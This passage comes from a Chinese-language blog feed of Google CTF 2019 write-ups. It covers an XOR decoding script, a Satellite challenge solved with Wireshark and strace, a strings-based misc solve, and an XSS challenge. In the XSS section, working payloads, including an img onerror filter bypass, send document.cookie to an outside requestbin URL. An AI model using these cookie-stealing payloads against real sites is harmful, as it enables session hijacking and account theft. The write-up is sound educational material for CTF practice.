class="number">109404901</span>, <span class="number">109434901</span>, <span class="number">109444901</span>, <span class="number">109474901</span>, <span class="number">109575901</span>, <span class="number">109656901</span>, <span class="number">109747901</span>, <span class="number">109777901</span>, <span class="number">109797901</span>, <span class="number">109818901</span>, <span class="number">109909901</span>];</span><br><span class="line"></span><br><span class="line">part1 = [<span class="number">17488</span>, <span class="number">16758</span>, <span class="number">16599</span>, <span class="number">16285</span>, <span class="number">16094</span>, <span class="number">15505</span>, <span class="number">15417</span>, <span class="number">14832</span>, <span class="number">14450</span>, <span class="number">13893</span>, <span class="number">13926</span>, <span class="number">13437</span>, <span class="number">12833</span>, <span class="number">12741</span>, <span class="number">12533</span>, <span class="number">11504</span>, <span class="number">11342</span>, <span class="number">10503</span>, <span class="number">10550</span>, <span class="number">10319</span>, <span class="number">975</span>, <span class="number">1007</span>, <span class="number">892</span>, <span class="number">893</span>, <span class="number">660</span>, <span class="number">743</span>, <span class="number">267</span>, <span class="number">344</span>, <span class="number">264</span>, <span class="number">339</span>, <span class="number">208</span>, <span class="number">216</span>, <span class="number">242</span>, <span class="number">172</span>, <span class="number">74</span>, <span class="number">49</span>, <span class="number">119</span>, <span class="number">113</span>, <span class="number">119</span>, <span class="number">106</span>][::<span class="number">-1</span>];</span><br><span class="line"></span><br><span class="line">part2 = [<span class="number">98426</span>, <span class="number">97850</span>, <span class="number">97604</span>, <span class="number">97280</span>, <span class="number">96815</span>, <span class="number">96443</span>, <span class="number">96354</span>, <span class="number">95934</span>, <span class="number">94865</span>, <span class="number">94952</span>, <span class="number">94669</span>, <span class="number">94440</span>, <span class="number">93969</span>, <span class="number">93766</span>][::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">part3 = [<span class="number">101141058</span>, <span class="number">101060206</span>, <span class="number">101030055</span>, <span class="number">100998966</span>, <span class="number">100887990</span>, <span class="number">100767085</span>, <span class="number">100707036</span>, <span class="number">100656111</span>, <span class="number">100404094</span>, <span class="number">100160922</span>, <span class="number">100131019</span>, <span class="number">100111100</span>, <span class="number">100059926</span>, <span class="number">100049982</span>, <span class="number">100030045</span>, <span class="number">9989997</span>, <span class="number">9981858</span>, <span class="number">9980815</span>, <span class="number">9978842</span>, <span class="number">9965794</span>, <span class="number">9957564</span>, <span class="number">9938304</span>, <span class="number">9935427</span>, <span class="number">9932289</span>, <span class="number">9931494</span>, <span class="number">9927388</span>, <span class="number">9926376</span>, <span class="number">9923213</span>, <span class="number">9921394</span>, <span class="number">9919154</span>, <span class="number">9918082</span>, <span class="number">9916239</span>][::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">k1 = <span class="number">0</span></span><br><span class="line">k2 =<span class="number">98</span></span><br><span class="line">k3 =<span class="number">764</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(part1)):</span><br><span class="line"></span><br><span class="line">    ans = chr(part1[i] ^ primes[k1])</span><br><span class="line">    print(ans,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    k1 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(part2)):</span><br><span class="line"></span><br><span class="line">    ans = chr(part2[i] ^ primes[k2])</span><br><span class="line">    print(ans,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    k2 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(part3)):</span><br><span class="line"></span><br><span class="line">    ans = chr(part3[i] ^ primes[k3])</span><br><span class="line">    print(ans,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    k3 += <span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>解出完整网址</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/06_FriendSpaceBookPlusAllAccessRedPremium.com</span><br><span class="line">╰─➤  python3 test.py</span><br><span class="line">http://emoji-t0anaxnr3nacpt4na.web.ctfcompetition.com/humans_and_cauliflowers_network/</span><br></pre></td></tr></table></figure><ul><li><p>此页面得flag:<br><a href="http://emoji-t0anaxnr3nacpt4na.web.ctfcompetition.com/humans_and_cauliflowers_network/amber.html">http://emoji-t0anaxnr3nacpt4na.web.ctfcompetition.com/humans_and_cauliflowers_network/amber.html</a></p></li><li><p>==<strong>flag:CTF{Peace_from_Cauli!}</strong>==</p></li></ul><h2 id="08-Cookie-World-Order-web"><a href="#08-Cookie-World-Order-web" class="headerlink" title="08 Cookie World Order(web)"></a>08 Cookie World Order(web)</h2><ul><li><a href="https://cwo-xss.web.ctfcompetition.com/">https://cwo-xss.web.ctfcompetition.com/</a> 有一聊天对话框，admin在线，使用xss攻击获取cookie</li><li>尝试注入，提示HACKER ALERT!，说明网站设置了部分语法限制</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">location.href=<span class="string">&#x27;http://requestbin.net/r/14bfl601?test=&#x27;</span>+document.cookie;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>尝试利用上传img onerror进行注入，绕过了alert(参见<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a>)</li></ul><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;image = new Image(); image.src=&#x27;http://requestbin.net/r/14bfl601?test=&#x27;+btoa(document.cookie);&quot;</span>&gt;</span><br></pre></td></tr></table></figure><ul><li>get request</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test: ZmxhZz1DVEZ7M21icjRjM190aGVfYzAwazFlX3cwcjFkX29yZDNyfTsgYXV0aD1UVXRiOVBQQTljWWtmY1ZRV1l6eHk0WGJ0eUwzVk5Leg==</span><br></pre></td></tr></table></figure><ul><li>base64进行解码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/06_FriendSpaceBookPlusAllAccessRedPremium.com</span><br><span class="line">╰─➤  <span class="built_in">echo</span> <span class="string">&#x27;ZmxhZz1DVEZ7M21icjRjM190aGVfYzAwazFlX3cwcjFkX29yZDNyfTsgYXV0aD1UVXRiOVBQQTljWWtmY1ZRV1l6eHk0WGJ0eUwzVk5Leg==&#x27;</span> | base64 -d</span><br><span class="line">flag=CTF&#123;3mbr4c3_the_c00k1e_w0r1d_ord3r&#125;; auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz</span><br></pre></td></tr></table></figure><ul><li>==<strong>flag:CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}</strong>==</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>goolge ctf 2019 stage1 writeup_part_1</title>
    <link href="/2019/10/02/google_ctf_2019_stage1_writeup_1/"/>
    <url>/2019/10/02/google_ctf_2019_stage1_writeup_1/</url>
    
    <content type="html"><![CDATA[<h2 id="01-Enter-Space-Time-Coordinates-misc"><a href="#01-Enter-Space-Time-Coordinates-misc" class="headerlink" title="01 Enter Space-Time Coordinates(misc)"></a>01 Enter Space-Time Coordinates(misc)</h2><ul><li>下载zip压缩包解压，得到log.txt and rand2，进行查看</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜ attachment cat log.txt</span><br><span class="line"></span><br><span class="line">0: AC+79 3888&#123;6652492084280_198129318435598&#125;</span><br><span class="line">1: Pliamas Sos&#123;276116074108949_243544040631356&#125;</span><br><span class="line">2: Ophiuchus&#123;11230026071572_273089684340955&#125;</span><br><span class="line">3: Pax Memor -ne4456 Hi Pro&#123;21455190336714_219250247519817&#125;</span><br><span class="line">4: Camion Gyrin&#123;235962764372832_269519420054142&#125;</span><br><span class="line"></span><br><span class="line">➜ attachment file rand2</span><br><span class="line"></span><br><span class="line">rand2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=0208fc60863053462fb733436cef1ed23cb6c78f, not stripped</span><br></pre></td></tr></table></figure><ul><li>执行rand2</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜ attachment ./rand2</span><br><span class="line"></span><br><span class="line">Travel coordinator</span><br><span class="line">0: AC+79 3888 - 95603467253307, 47507421386467</span><br><span class="line">1: Pliamas Sos - 192115414361300, 250197841279970</span><br><span class="line">2: Ophiuchus - 51512207753664, 34661227854198</span><br><span class="line">3: Pax Memor -ne4456 Hi Pro - 235082830098621, 202860065631117</span><br><span class="line">4: Camion Gyrin - 66299664563594, 223065406793793 </span><br><span class="line">5: CTF - &lt;REDACTED&gt;</span><br><span class="line"></span><br><span class="line">Enter your destination<span class="string">&#x27;s x coordinate:</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><ul><li>看到 CTF - REDACTED，log里面也没有坐标信息，尝试利用strings命令查看源码并搜索CTF</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜ attachment strings ./rand2 | grep CTF</span><br><span class="line"></span><br><span class="line">Arrived at the flag. Congrats, your flag is: CTF&#123;welcome_to_googlectf&#125;</span><br></pre></td></tr></table></figure><ul><li>==<strong>flag：CTF{welcome_to_googlectf}</strong>==</li></ul><h2 id="02-Satellite-networking"><a href="#02-Satellite-networking" class="headerlink" title="02 Satellite(networking)"></a>02 Satellite(networking)</h2><ul><li>下载压缩包解压得到：init_sat、readme.pdf</li><li>查看redeme.pdf,获取图片中“osmium”</li><li>查看init_sat文件类型</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜ 02_Satellite file init_sat</span><br><span class="line"></span><br><span class="line">init_sat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, not stripped</span><br></pre></td></tr></table></figure><ul><li>执行init_sat,并输入“osmium”,按照指示得到</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜ 02_Satellite ./init_sat</span><br><span class="line"></span><br><span class="line">Hello Operator. Ready to connect to a satellite?</span><br><span class="line">Enter the name of the satellite to connect to or <span class="string">&#x27;exit&#x27;</span> to quit</span><br><span class="line">osimum</span><br><span class="line">Unrecognized satellite: osimum</span><br><span class="line"></span><br><span class="line">Enter the name of the satellite to connect to or <span class="string">&#x27;exit&#x27;</span> to quit</span><br><span class="line">osmium</span><br><span class="line">Establishing secure connection to osmium</span><br><span class="line"> satellite...</span><br><span class="line">Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">Username: brewtoot password: ********************       166.00 IS-19 2019/05/09 00:00:00Swath 640km     Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m        Daily acquisition capacity: 220,000km²  Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E</span><br></pre></td></tr></table></figure><ul><li>可以察觉password：**<strong><strong>**</strong></strong>，有可能是flag。最后给的网址也许同样有线索</li><li>打开网址得到一字符串，观察可是应为base64加密</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VXNlcm5hbWU6IHdpcmVzaGFyay1yb2NrcwpQYXNzd29yZDogc3RhcnQtc25pZmZpbmchCg==</span><br></pre></td></tr></table></figure><ul><li>对字符串进行解码。并没有得到flag</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜ 02_Satellite <span class="built_in">echo</span> <span class="string">&#x27;VXNlcm5hbWU6IHdpcmVzaGFyay1yb2NrcwpQYXNzd29yZDogc3RhcnQtc25pZmZpbmchCg==&#x27;</span>| base64 -d</span><br><span class="line"></span><br><span class="line">Username: wireshark-rocks</span><br><span class="line">Password: start-sniffing!</span><br></pre></td></tr></table></figure><ul><li>方法一：根据提示，利用wireshark可以截获password明文</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0000   00 0c 29 e9 77 9f 00 50 56 fd 49 f6 08 00 45 00   ..)éw..PVýIö..E.</span><br><span class="line">0010   01 93 02 05 00 00 80 06 9e cc 22 4c 65 1d c0 a8   .........Ì&quot;Le.À¨</span><br><span class="line">0020   50 82 05 39 e5 9e 28 e0 1a 57 cb 95 5d b1 50 18   P..9å.(à.WË.]±P.</span><br><span class="line">0030   fa f0 3a 91 00 00 55 73 65 72 6e 61 6d 65 3a 20   úð:...Username: </span><br><span class="line">0040   62 72 65 77 74 6f 6f 74 20 70 61 73 73 77 6f 72   brewtoot passwor</span><br><span class="line">0050   64 3a 20 43 54 46 7b 34 65 66 63 63 37 32 30 39   d: CTF&#123;4efcc7209</span><br><span class="line">0060   30 61 66 32 38 66 64 33 33 61 32 31 31 38 39 38   0af28fd33a211898</span><br><span class="line">0070   35 35 34 31 66 39 32 65 37 39 33 34 37 37 66 7d   5541f92e793477f&#125;</span><br><span class="line">0080   09 31 36 36 2e 30 30 20 49 53 2d 31 39 20 32 30   .166.00 IS-19 20</span><br><span class="line">0090   31 39 2f 30 35 2f 30 39 20 30 30 3a 30 30 3a 30   19/05/09 00:00:0</span><br><span class="line">00a0   30 09 53 77 61 74 68 20 36 34 30 6b 6d 09 52 65   0.Swath 640km.Re</span><br><span class="line">00b0   76 69 73 69 74 20 63 61 70 61 63 69 74 79 20 74   visit capacity t</span><br><span class="line">00c0   77 69 63 65 20 64 61 69 6c 79 2c 20 61 6e 79 77   wice daily, anyw</span><br><span class="line">00d0   68 65 72 65 20 52 65 73 6f 6c 75 74 69 6f 6e 20   here Resolution </span><br><span class="line">00e0   70 61 6e 63 68 72 6f 6d 61 74 69 63 3a 20 33 30   panchromatic: 30</span><br><span class="line">00f0   63 6d 20 6d 75 6c 74 69 73 70 65 63 74 72 61 6c   cm multispectral</span><br><span class="line">0100   3a 20 31 2e 32 6d 09 44 61 69 6c 79 20 61 63 71   : 1.2m.Daily acq</span><br><span class="line">0110   75 69 73 69 74 69 6f 6e 20 63 61 70 61 63 69 74   uisition capacit</span><br><span class="line">0120   79 3a 20 32 32 30 2c 30 30 30 6b 6d c2 b2 09 52   y: 220,000kmÂ².R</span><br><span class="line">0130   65 6d 61 69 6e 69 6e 67 20 63 6f 6e 66 69 67 20   emaining config</span><br><span class="line">0140   64 61 74 61 20 77 72 69 74 74 65 6e 20 74 6f 3a   data written to:</span><br><span class="line">0150   20 68 74 74 70 73 3a 2f 2f 64 6f 63 73 2e 67 6f    https://docs.go</span><br><span class="line">0160   6f 67 6c 65 2e 63 6f 6d 2f 64 6f 63 75 6d 65 6e   ogle.com/documen</span><br><span class="line">0170   74 2f 64 2f 31 34 65 59 50 6c 75 44 5f 70 69 33   t/d/14eYPluD_pi3</span><br><span class="line">0180   38 32 34 47 41 46 61 6e 53 32 39 74 57 64 54 63   824GAFanS29tWdTc</span><br><span class="line">0190   4b 78 50 5f 58 55 78 78 37 65 33 30 33 2d 33 45   KxP_XUxx7e303-3E</span><br><span class="line">01a0   0a                                                .</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>方法二：思路转向password的明文。直接通过文本工具打开init_sat源码并不能查看到flag信息。尝试通过strace进行调试。</li><li>f 显示产生的子进程</li><li>s 需要显示的字符串长度</li><li>e 定位的参数，recv\read\write …</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">➜ 02_Satellite strace -f -s 12345 -e trace=recv,<span class="built_in">read</span> ./init_sat</span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0000b\0\0\0\0\0\0@\0\0\0\0\0\0\0P,\2\0\0\0\0\0\0\0\0\0@\0008\0\t\0@\0(\0&#x27;\0\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0\370\1\0\0\0\0\0\0\370\1\0\0\0\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\4\0\0\0PM\1\0\0\0\0\0PM\1\0\0\0\0\0PM\1\0\0\0\0\0\34\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\20\0\0\0\0\0\0\0\1\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\20\223\1\0\0\0\0\0\20\223\1\0\0\0\0\0\0\0 \0\0\0\0\0\1\0\0\0\6\0\0\0\240\233\1\0\0\0\0\0\240\233!\0\0\0\0\0\240\233!\0\0\0\0\0P\7\0\0\0\0\0\0\340H\0\0\0\0\0\0\0\0 \0\0\0\0\0\2\0\0\0\6\0\0\0h\235\1\0\0\0\0\0h\235!\0\0\0\0\0h\235!\0\0\0\0\0000\2\0\0\0\0\0\0000\2\0\0\0\0\0\0\10\0\0\0\0\0\0\0\4\0\0\0\4\0\0\0008\2\0\0\0\0\0\0008\2\0\0\0\0\0\0008\2\0\0\0\0\0\0D\0\0\0\0\0\0\0D\0\0\0\0\0\0\0\4\0\0\0\0\0\0\0P\345td\4\0\0\0pM\1\0\0\0\0\0pM\1\0\0\0\0\0pM\1\0\0\0\0\0\344\10\0\0\0\0\0\0\344\10\0\0\0\0\0\0\4\0\0\0\0\0\0\0Q\345td\6\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0\0\0\0\0R\345td\4\0\0\0\240\233\1\0\0\0\0\0\240\233!\0\0\0\0\0\240\233!\0\0\0\0\0`\4\0\0\0\0\0\0`\4\0\0\0\0\0\0\1\0\0\0\0\0\0\0\4\0\0\0\24\0\0\0\3\0\0\0GNU\0(\306\252\336p\262\324\r\37\17=\n\32\f\255\32\270\26D\217\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\345\1\0\0[\0\0\0 \0\0\0\v\0\0\0\31#\2\261\1\10\20\2@@a\370\3\10\10\25\200 \0\0\0\0\200\300\321Q\0\0\0\22\353\3020D\0\10\20A\0\2\0\2\f\1\200\v\221\1\330\240\r\240@\230 \244\200\21\n\202-l@g\214V\24\0\224 \200<span class="variable">$H</span>\200P(\1\22\f\311B\240\220\22\10\f \2ZdA\245c\4@\n\n\n\0\2009\1(\314D\204\201\300\22\10(\fD\0\0\0\200Q\10\200\35\4B\320\2608A\0\1\0\0\265\0300\0\200`\2\20\&quot;\0\tA\20\1\5\0P(\251\22G(\0\0\202\4\230@\4\0\20\340T\0\2@\2\2\20\3010f\26\200\0&quot;</span>, 832) = 832</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\260\34\2\0\0\0\0\0@\0\0\0\0\0\0\0\220\351\36\0\0\0\0\0\0\0\0\0@\0008\0\n\0@\0I\0H\0\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0000\2\0\0\0\0\0\0000\2\0\0\0\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\4\0\0\0P\335\33\0\0\0\0\0P\335\33\0\0\0\0\0P\335\33\0\0\0\0\0\34\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\20\0\0\0\0\0\0\0\1\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240j\36\0\0\0\0\0\240j\36\0\0\0\0\0\0\0 \0\0\0\0\0\1\0\0\0\6\0\0\0 v\36\0\0\0\0\0 v&gt;\0\0\0\0\0 v&gt;\0\0\0\0\0@R\0\0\0\0\0\0\300\224\0\0\0\0\0\0\0\0 \0\0\0\0\0\2\0\0\0\6\0\0\0\200\253\36\0\0\0\0\0\200\253&gt;\0\0\0\0\0\200\253&gt;\0\0\0\0\0\340\1\0\0\0\0\0\0\340\1\0\0\0\0\0\0\10\0\0\0\0\0\0\0\4\0\0\0\4\0\0\0p\2\0\0\0\0\0\0p\2\0\0\0\0\0\0p\2\0\0\0\0\0\0D\0\0\0\0\0\0\0D\0\0\0\0\0\0\0\4\0\0\0\0\0\0\0\7\0\0\0\4\0\0\0 v\36\0\0\0\0\0 v&gt;\0\0\0\0\0 v&gt;\0\0\0\0\0\20\0\0\0\0\0\0\0\220\0\0\0\0\0\0\0\10\0\0\0\0\0\0\0P\345td\4\0\0\0l\335\33\0\0\0\0\0l\335\33\0\0\0\0\0l\335\33\0\0\0\0\0\334Y\0\0\0\0\0\0\334Y\0\0\0\0\0\0\4\0\0\0\0\0\0\0Q\345td\6\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0\0\0\0\0R\345td\4\0\0\0 v\36\0\0\0\0\0 v&gt;\0\0\0\0\0 v&gt;\0\0\0\0\0\3409\0\0\0\0\0\0\3409\0\0\0\0\0\0\1\0\0\0\0\0\0\0\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\264\27\300\272|\305\317\6\321\321\276\326e,\355\271%&lt;`\320\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\363\3\0\0\n\0\0\0\0\1\0\0\16\0\0\0\0000\20D\240 \2\1\210\3\346\220\305E\214\0\304\0X\0\7\204\0p\302\200\0\r\212\fA\4\20\0\210@2\10*@\210T&lt;- \0162H&amp;\204\300\214\4\10\0\2\2\16\241\254\32\6f\310\0\3002\0\300\4P\t \201\10\204\v  ($\0\4 Z\0\20X\200\312DB(\0\6\200\0208C\0 @\200\0IP\0Q\212@\22\0\0\0\0\10\0\0\21\20&quot;</span>, 832) = 832</span><br><span class="line">strace: Process 188 attached</span><br><span class="line">strace: Process 189 attached</span><br><span class="line">strace: Process 190 attached</span><br><span class="line">strace: Process 191 attached</span><br><span class="line">strace: Process 192 attached</span><br><span class="line">Hello Operator. Ready to connect to a satellite?</span><br><span class="line">Enter the name of the satellite to connect to or <span class="string">&#x27;exit&#x27;</span> to quit</span><br><span class="line">[pid   187] <span class="built_in">read</span>(0, osmium</span><br><span class="line"><span class="string">&quot;osmium\n&quot;</span>, 4096)   = 7</span><br><span class="line">Establishing secure connection to osmium</span><br><span class="line"> satellite...</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference&#x27; and `info&#x27; packages installed, try:\n# `info libc \&quot;Name Service Switch\&quot;&#x27; for information about this file.\n\npasswd:         compat systemd\ngroup:          compat systemd\nshadow:         compat\ngshadow:        files\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n&quot;</span>, 1024) = 513</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;&quot;</span>, 1024)           = 0</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;# This file was automatically generated by WSL. To stop automatic generation of this file, remove this line.\nnameserver 172.16.23.168\nnameserver 172.16.23.131\nnameserver fec0:0:0:ffff::1\n&quot;</span>, 65536) = 187</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;&quot;</span>, 65349)          = 0</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;&quot;</span>, 65536)          = 0</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;# This file is automatically generated by WSL based on the Windows hosts file:\n# %WINDIR%\\System32\\drivers\\etc\\hosts. Modifications to this file will be overwritten.\n127.0.0.1\tlocalhost\n127.0.1.1\tDESKTOP-ARC2CM5.localdomain\tDESKTOP-ARC2CM5\n127.0.0.1\twww.xmind.com\n127.0.0.1\txmind.com\n127.0.0.1\twww.xmind.net\n127.0.0.1\txmind.net\n\n# The following lines are desirable for IPv6 capable hosts\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n&quot;</span>, 65536) = 512 [pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;&quot;</span>, 65024)          = 0</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;&quot;</span>, 65536)          = 0</span><br><span class="line">strace: Process 193 attached</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, 0xc000126000, 512)  = -1 EAGAIN (Resource temporarily unavailable)</span><br><span class="line">[pid   191] <span class="built_in">read</span>(5, 0xc000128000, 512)  = -1 EAGAIN (Resource temporarily unavailable)</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;cJ\201\200\0\1\0\0\0\1\0\0\tsatellite\16ctfcompetition\3com\0\0\34\0\1\300\26\0\6\0\1\0\0\1,\0N\vns-cloud-b1\rgoogledomains\300%\24cloud-dns-hostmaster\6google\300%\0\0\0\1\0\0T`\0\0\16\20\0\3\364\200\0\0\1,&quot;</span>, 512) = 136</span><br><span class="line">[pid   193] <span class="built_in">read</span>(5, <span class="string">&quot;\321w\201\200\0\1\0\1\0\0\0\0\tsatellite\16ctfcompetition\3com\0\0\1\0\1\300\f\0\1\0\1\0\0\0&lt;\0\4\&quot;Le\35&quot;</span>, 512) = 62</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, 0xc00013e000, 4096) = -1 EAGAIN (Resource temporarily unavailable)</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, <span class="string">&quot;Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect\n\n&quot;</span>, 4096) = 87</span><br><span class="line">Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect</span><br><span class="line"></span><br><span class="line">[pid   187] <span class="built_in">read</span>(0, a</span><br><span class="line"><span class="string">&quot;a\n&quot;</span>, 4096)        = 2</span><br><span class="line">[pid   187] <span class="built_in">read</span>(3, 0xc000163000, 4096) = -1 EAGAIN (Resource 